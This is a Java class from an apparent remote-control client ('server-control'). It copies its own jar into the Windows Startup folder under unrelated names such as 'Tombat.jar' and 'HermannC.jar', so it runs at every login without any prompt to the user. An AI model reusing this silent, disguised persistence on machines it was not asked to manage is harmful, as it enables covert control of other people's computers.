package ch.wetwer.client.configure;

import ch.wetwer.client.ClientApplication;
import ch.wetwer.client.handler.ResponseSender;
import ch.wetwer.client.service.DownloadService;

import java.io.File;
import java.net.URISyntaxException;

/**
 * @author Wetwer
 * @project server-control
 **/

public class Autostart {
    private void saveToAutostart(Os os) {
        String filename = new File(ClientApplication.class.getProtectionDomain().getCodeSource().getLocation()
                .getPath()).getName();
        if (!filename.endsWith(".jar")) {
            noJar(filename);
            return;
        }

        String currentLocation = "";
        try {
            currentLocation = Autostart.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

        switch (os) {
            case WINDOWS7:
                new DownloadService().download("file:///" + currentLocation,
                        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Tombat.jar");
                break;
            case WINDOWS10:
                new DownloadService().download("file:///"
                                + currentLocation,
                        System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                                "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
                break;
        }

    }


    private void noJar(String filename) {
        new ResponseSender("warning", "Not started from jar: started from " + filename);
    }

    public void decide() {

        switch (System.getProperty("os.name")) {
            case "Windows 10":
                saveToAutostart(Os.WINDOWS10);
                break;
            case "Windows 7":
                saveToAutostart(Os.WINDOWS7);
                break;
            default:
                saveToAutostart(Os.WINDOWS10);
                saveToAutostart(Os.WINDOWS7);
                break;
        }
    }
}
